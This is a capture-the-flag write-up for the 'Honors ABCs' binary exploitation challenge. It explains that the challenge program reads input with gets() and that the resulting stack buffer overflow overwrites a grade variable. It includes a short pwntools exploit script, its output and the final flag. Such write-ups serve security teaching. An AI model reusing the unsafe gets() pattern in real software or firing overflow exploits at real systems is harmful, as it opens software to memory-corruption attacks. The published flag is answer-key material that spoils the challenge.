# Honors ABCs

#### Category : binex
#### Points : 75 points (254 solves)
#### Author : Edward Feng

## Challenge
Here at BCA, we don't deal with normal classes. Everything is at the honors level or above! Let's start by learning about the alphabet.

And by learning, we obviously mean testing. Don't cheat!

-   [honors-abcs.c](https://objects.bcactf.com/bcactf2/honors-abcs/honors-abcs.c)
-   [honors-abcs](https://objects.bcactf.com/bcactf2/honors-abcs/honors-abcs)
-   `nc bin.bcactf.com 49155`

## Solution
This was a simple buffer overflow exploit.

#### Vulnerable code
```cpp
	puts("╔════════════════════════╗");
    puts("║ THE QUIZ               ║");
    puts("║                        ║");
    puts("║ 1) Recite the alphabet ║");
    puts("╚════════════════════════╝");
    puts("");
    printf("Answer for 1: ");
    gets(response);

    for (int i = 0; i < 26; ++i) {
        if (response[i] == 0)
            break;
        if (response[i] != correct[i])
            break;

        grade = i * 4;
    }
```
`gets` is being used in the code, so we can overwrite the variable `grade` using it.

#### flag code
```cpp
else if (grade == 100) {
        puts("Perfect score!");
        puts("You are an model BCA student.");
    } else {
        puts("How did you end up here?");
        sleep(2);
        puts("You must have cheated!");
        sleep(2);
        puts("Let me recite the BCA plagarism policy.");
        sleep(2);

        FILE *fp = fopen("flag.txt", "r");
```

#### Getting flag.txt
So clearly, we don't need to assign a particular value to `grade` so we can just send a lot of `A`s and we should get the flag.

```python
#!/usr/bin/python2
from pwn import *
host = "bin.bcactf.com"
port = 49155
s = remote(host, port)
s.recvuntil("Answer for 1: ")
s.sendline("A"*200)
s.recvuntil("BCA plagarism policy.")
print(s.recvuntil("bcactf{")[-7:] + s.recvuntil("}"))
```

```bash
$ python get_flag.py
[+] Opening connection to bin.bcactf.com on port 49155: Done
bcactf{now_i_know_my_A_B_Cs!!_next_time_wont_you_cheat_with_me??}
[*] Closed connection to bin.bcactf.com port 49155
```

flag  : `bcactf{now_i_know_my_A_B_Cs!!_next_time_wont_you_cheat_with_me??}`